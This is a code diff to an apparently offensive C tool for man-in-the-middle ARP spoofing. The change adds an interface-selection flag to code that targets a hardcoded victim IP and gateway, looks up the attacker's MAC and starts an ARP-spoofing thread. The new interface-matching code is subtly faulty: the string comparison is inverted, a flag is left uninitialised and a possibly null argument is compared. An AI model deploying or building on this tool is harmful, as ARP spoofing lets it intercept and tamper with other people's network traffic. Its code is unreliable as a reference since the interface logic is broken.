@@ -14,7 +14,8 @@ bool debug=false;
 void usage(){
 	printf("MITM usage:\n"
 		"  -h = show this help test\n"
-		"  -d = increase debugging verbosity\n");
+		"  -d = increase debugging verbosity\n"
+		"  -i = interface name\n");
 }
 void* arp_spoof(void* info){
 	MITM_info* m_info= (MITM_info*)info;
@@ -49,10 +50,10 @@ int main(int argc,char* argv[]){
 	u_char TARGET_IP[4]={192,168,43,127};
 	u_char GATEWAY_IP[4]={192,168,43,1};
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char* dev;
-
+	pcap_if_t* if_buf;
+	char* usr_dev;
 	for(;;){
-		c=getopt(argc, argv,"hd");
+		c=getopt(argc, argv,"i:hd");
 		if(c < 0)break;
 		switch(c){
 			case 'h':
@@ -61,6 +62,9 @@ int main(int argc,char* argv[]){
 			break;
 			case 'd':
 				debug=true;
+			break;
+			case 'i':
+				usr_dev = optarg;
 			break;
 			default:
 		       		usage();
@@ -74,14 +78,23 @@ int main(int argc,char* argv[]){
 	pthread_attr_init(&a);
 	pthread_attr_setdetachstate(&a,PTHREAD_CREATE_DETACHED);
 	
-	dev = pcap_lookupdev(errbuf);
-	if(!dev){
-		printf("%s\n",errbuf);
-		return 1;
+	if(!pcap_findalldevs(&if_buf,errbuf)){
+		bool get_dev;
+		while(if_buf->next){
+			if(strcmp(usr_dev,if_buf->name)) {
+				get_dev = true;
+				break;
+			}
+			if_buf = if_buf->next;
+		}
+		if(!get_dev){
+			printf("input interface can't find");
+			return -1;	
+		}
 	}else{
-		if(debug)printf("dev is %s\n",dev);
+		printf("%s\n",errbuf);
 	}
-	getAttackerMAC(dev,ATTACKER_MAC);
+	getAttackerMAC(usr_dev,ATTACKER_MAC);
 	print_mac(ATTACKER_MAC);
 
         MITM_info info={
@@ -91,7 +104,7 @@ int main(int argc,char* argv[]){
                 .TARGET_IP=TARGET_IP,
                 .GATEWAY_IP=GATEWAY_IP,
         };
-        strcpy(info.dev,dev);
+        strcpy(info.dev,usr_dev);
 	/* init fake arp and the return value should be the next input to send_fake_arp op */
 	pthread_create(&t,NULL,arp_spoof,&info);
 	pthread_join(t,NULL);
